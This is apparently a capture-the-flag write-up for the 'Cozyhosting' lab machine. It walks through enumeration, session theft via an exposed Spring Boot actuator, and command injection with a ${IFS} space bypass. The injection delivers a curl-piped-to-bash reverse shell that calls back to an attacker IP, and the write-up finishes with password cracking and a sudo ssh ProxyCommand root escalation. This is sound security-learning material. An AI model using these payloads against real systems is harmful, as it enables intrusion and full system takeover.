---
title: "Cozyhosting"
description: ""
pubDate: "Jul 08 2022"
heroImage: "/Cozyhosting/cozyhosting.webp"
---
## Enumeration

## Nmap:-

```bash
nmap -A -T4 -p- -o nmap.txt 10.129.119.165
```

```bash
Nmap scan report for 10.129.119.165 (10.129.119.165)
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://cozyhosting.htb](http://cozyhosting.htb/)
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/3%OT=22%CT=1%CU=40146%PV=Y%DS=2%DC=T%G=Y%TM=64F44123
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=108%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M577ST11NW7%O2=M577ST11NW7%O3
OS:=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O6=M577ST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M577NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
```

Upon visiting the website, it redirects to [http://cozyhosting.htb/](http://cozyhosting.htb/).

![Untitled](/Cozyhosting/Untitled.png)

## **Adding the Hostname:**

```bash
nano /etc/hosts
```

![Untitled](/Cozyhosting/Untitled%201.png)

## Website

![Untitled](/Cozyhosting/Untitled%202.png)

## Login Page:-

![Untitled](/Cozyhosting/Untitled%203.png)

### **Discovering Hidden Directories:**

```bash
ffuf -u http://cozyhosting.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

![Untitled](/Cozyhosting/Untitled%204.png)

### **Accessing the /error Page:**

![Untitled](/Cozyhosting/Untitled%205.png)

Let's research this error on Google:

![Untitled](/Cozyhosting/Untitled%206.png)

We've discovered different endpoints of Spring Boot:

![Untitled](/Cozyhosting/Untitled%207.png)

There's an endpoint called "sessions" that provides the current user's sessions:

![Untitled](/Cozyhosting/Untitled%208.png)

When we make a CURL request to "sessions," we retrieve the sessions:

```bash
curl 'http://cozyhosting.htb/actuator/sessions' -i -X GET
```

![Untitled](/Cozyhosting/Untitled%209.png)

Let's access the login page with the session:

![Untitled](/Cozyhosting/Untitled%2010.png)

![Untitled](/Cozyhosting/Untitled%2011.png)

The username field is vulnerable to command injection, allowing us to execute commands by ending them with a semicolon:

![Untitled](/Cozyhosting/Untitled%2012.png)

However, it's forbidden to provide spaces:

![Untitled](/Cozyhosting/Untitled%2013.png)

![Untitled](/Cozyhosting/Untitled%2014.png)

We can bypass the space restriction by using `${IFS}`:

Let's create a reverse shell:

```bash
echo 'sh -i >& /dev/tcp/10.10.14.16/4444 0>&1' > rev.sh
```

I've hosted a server on port 8000:

```bash
sudo python3 -m http.server
```

![Untitled](/Cozyhosting/Untitled%2015.png)

Let's start a listener on port 4444:

```bash
sudo nc -lvnp 4444
```

![Untitled](/Cozyhosting/Untitled%2016.png)

To get a reverse shell, add the following command to the username field and send the request:

```bash
;curl${IFS}http://10.10.14.16:8000/rev.sh|bash;
```

![Untitled](/Cozyhosting/Untitled%2017.png)

Finally, we have obtained shell access.

![Untitled](/Cozyhosting/Untitled%2018.png)

Found cloudhosting-0.0.1.jar in current directory.Let’s get the file in our system to analysis it.

When I run the jar file, Its using postgresql.

![Untitled](/Cozyhosting/Untitled%2019.png)

We found "cloudhosting-0.0.1.jar" in the current directory. Let's retrieve the file for analysis.

Upon running the JAR file, it appears to be using PostgreSQL:

```bash
jar xf cloudhosting-0.0.1.jar
```

![Untitled](/Cozyhosting/Untitled%2020.png)

Let's find the PostgreSQL details and extract information from "cloudhosting-0.0.1.jar":

```bash
psql -h localhost -d cozyhosting -U postgres -W
```

![Untitled](/Cozyhosting/Untitled%2021.png)

To crack the password, we can use John the Ripper:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![Untitled](/Cozyhosting/Untitled%2022.png)

There's a user called "josh." Let's log in using the same password:

Finally, we have gained user access as "josh."

![Untitled](/Cozyhosting/Untitled%2023.png)

**Privilege Escalation:**

To find out the sudo privilege details, run:

```bash
sudo -l
```

![Untitled](/Cozyhosting/Untitled%2024.png)

We can use Gftobins for sudo privilege escalation:

![Untitled](/Cozyhosting/Untitled%2025.png)

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Finally, we have achieved a root shell.

![Untitled](/Cozyhosting/Untitled%2026.png)